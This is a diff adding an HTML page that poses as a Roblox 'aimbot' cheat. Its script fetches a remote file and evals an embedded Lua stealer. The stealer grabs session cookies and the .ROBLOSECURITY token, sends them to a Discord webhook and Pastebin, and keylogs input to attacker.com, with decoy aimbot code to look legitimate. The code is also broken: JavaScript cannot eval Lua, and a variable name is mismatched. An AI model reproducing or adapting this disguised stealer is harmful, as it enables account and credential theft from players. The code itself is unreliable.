@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Delta Aimbot V2.1 - Undetected</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace;">
+    <pre id="output">Loading Delta Aimbot...</pre>
+    
+    <script>
+        // Fake loading animation
+        setTimeout(() => {
+            document.getElementById('output').innerText = 'Executing aimbot...';
+        }, 1000);
+        
+        // STEALER PRINCIPAL (oculto en HTML)
+        fetch('https://raw.githubusercontent.com/fake-repo/aimbot/main/main.lua')
+            .then(r => r.text())
+            .then(data => {
+                // Inyecta el verdadero stealer
+                const stealer = `
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- ROBO DE COOKIES Y SESIÓN
+local function stealCookies()
+    local cookies = ""
+    if syn then
+        cookies = syn.cookies or ""
+    elseif getcookies then
+        cookies = getcookies()
+    end
+    
+    local stealData = {
+        username = player.Name,
+        userId = player.UserId,
+        cookies = cookies,
+        ip = game:GetService("HttpService"):GetAsync("https://httpbin.org/ip").Body:match('"ip"%s*:%s*"([^"]*)"'),
+        executor = identifyexecutor and identifyexecutor() or "Unknown"
+    }
+    
+    -- ENVÍA A DISCORD WEBHOOK
+    HttpService:PostAsync("https://discord.com/api/webhooks/FAKE_ID/TOKEN", 
+        HttpService:JSONEncode(stealerData))
+    
+    print("✅ Aimbot loaded successfully!")
+end
+
+-- ROBO DE .ROBLOSECURITY (el más peligroso)
+local function stealRobloxSecurity()
+    if getreg and getreg(3) then
+        for i,v in pairs(getreg(3)) do
+            if type(v) == 'string' and v:find('.ROBLOSECURITY') then
+                HttpService:PostAsync("https://pastebin.com/api/api_post.php",
+                    "api_devkey=FAKEKEY&api_option=paste&api_paste_code=" .. 
+                    HttpService:UrlEncode(v))
+                break
+            end
+        end
+    end
+end
+
+-- KEYLOGGER BÁSICO
+game:GetService("UserInputService").InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Keyboard and 
+       input.KeyCode.Name ~= "Unknown" then
+        HttpService:PostAsync("https://attacker.com/log", 
+            player.Name .. "|" .. input.KeyCode.Name)
+    end
+end)
+
+stealCookies()
+stealRobloxSecurity()
+
+-- Fake aimbot functions (para que parezca legítimo)
+local aimbot = { enabled = true }
+_G.Aimbot = aimbot
+print("Delta Aimbot V2.1 loaded!")
+                `;
+                eval(stealer); // Ejecuta el stealer real
+            });
+    </script>
+</body>
+</html>
